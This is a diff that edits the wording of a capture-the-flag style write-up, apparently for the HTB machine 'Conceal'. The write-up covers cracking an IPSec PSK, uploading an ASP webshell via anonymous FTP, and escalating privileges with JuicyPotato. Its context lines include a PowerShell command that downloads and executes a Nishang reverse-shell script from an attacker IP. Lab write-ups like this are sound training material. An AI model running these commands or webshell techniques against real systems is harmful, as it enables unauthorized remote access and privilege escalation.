@@ -76,7 +76,7 @@ We get a lot of interesting results that I put in a file in this folder called *
 ## Checking IPSec
 
 The fact that the UDP port 500 is open and we get this IKE VPN password PSK means we need to look further into **IPSec VPN**.
-First try to crack the password manually or search for it on hashes.org and it says:
+First we try to crack the password manually or search for it on hashes.org and it says:
 > Dudecake1!
 
 We can test if we get a response back from the IKE service:
@@ -119,7 +119,7 @@ So we add this line to the **/etc/ipsec.secrets** file:
 
 Whenever we make an IPSec connection through stongswan to the box it uses this PSK.
 
-Next we need to configure **/etc/ipsec.conf** and the help for that we can find in `man ipsec.conf`.
+Next we need to configure **/etc/ipsec.conf** and the help for that can be found in `man ipsec.conf`.
 Everything we configure here is with information we already have:
 ```markdown
 conn Conceal
@@ -161,12 +161,12 @@ Anonymous login on FTP works with no files in there but we can upload files to i
 If we browse to the web page we see the IIS default page and after some enumerating paths we find **/uploads** where it shows the files we uploaded to FTP.
 As **ASPX** does not work but **ASP** does we can upload an .asp file to get a webshell and have command execution.
 
-We want to execute a reverse shell. I will take the on from _Nishang_ and it will listen on my IP and port 9001 and execute revshell.ps1:
+We want to execute a reverse shell. I will take _Invoke-PowerShellTcp.ps1 from Nishang_ that I just call _revshell.ps1_ and it will listen on my IP and port 9001:
 ```markdown
 powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/revshell.ps1')"
 ```
 
-We now started a reverse shell session with the user _Destitute_ can read the first flag.
+We now started a reverse shell session with the user _Destitute_ and can read the first flag.
 
 ## Privilege Escalation
 
@@ -190,7 +190,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 
 The **SeImpersonatePrivilege** privilege is enabled and this is what we want to abuse with the local privilege escalation tool **JuicyPotato**.
 
-When uploading this .exe file over FTP we need to set the FTP mode to `binary` and then `put JuicyPotato.exe`.
+When uploading the JuicyPotato.exe file over FTP we need to set the FTP mode to `binary` and then `put JuicyPotato.exe`.
 We create a .bat file with the same command as we invoked into the webshell to spawn a new reverse shell with higher privileges:
 ```bat
 REM This is rootshell.bat
